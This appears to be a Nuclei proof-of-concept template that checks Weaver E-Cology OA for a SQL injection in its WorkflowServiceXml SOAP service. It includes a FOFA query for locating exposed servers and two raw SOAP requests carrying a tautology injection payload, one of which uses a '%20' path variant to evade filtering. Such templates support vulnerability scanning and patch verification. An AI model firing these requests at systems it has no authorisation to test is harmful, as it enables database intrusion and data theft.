mypocs/nuclei/nuclei-泛微E-Cology-WorkflowServiceXml-SQL注入漏洞.yaml

id: Weaver-E-Cology-WorkflowServiceXml-sql
info:
  name: 泛微E-Cology WorkflowServiceXml SQL注入漏洞(QVD-2024-26136)
  author: Superhero
  severity: high
  description: |-
    fofa: app="泛微-OA（e-cology）"
    泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140493841
  tags: sql injection



http:
  - raw:
      - |
        POST /services/WorkflowServiceXml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
          <soapenv:Header/>
            <soapenv:Body>
              <web:getHendledWorkflowRequestList>
                <web:in0>1</web:in0>
                <web:in1>1</web:in1>
                <web:in2>1</web:in2>
                <web:in3>1</web:in3>
                <web:in4>
                  <web:string>1=1 AND 2=2</web:string>
                </web:in4>
              </web:getHendledWorkflowRequestList>
            </soapenv:Body>
        </soapenv:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'WorkflowRequestInfo'
          - 'workflowName'
          - 'lastOperatorName'
      - type: status
        status: 
          - 200

  - raw:
      - |
        POST /services%20/WorkflowServiceXml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
          <soapenv:Header/>
            <soapenv:Body>
              <web:getHendledWorkflowRequestList>
                <web:in0>1</web:in0>
                <web:in1>1</web:in1>
                <web:in2>1</web:in2>
                <web:in3>1</web:in3>
                <web:in4>
                  <web:string>1=1 AND 2=2</web:string>
                </web:in4>
              </web:getHendledWorkflowRequestList>
            </soapenv:Body>
        </soapenv:Envelope>
      

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'WorkflowRequestInfo'
          - 'workflowName'
          - 'lastOperatorName'
      - type: status
        status: 
          - 200





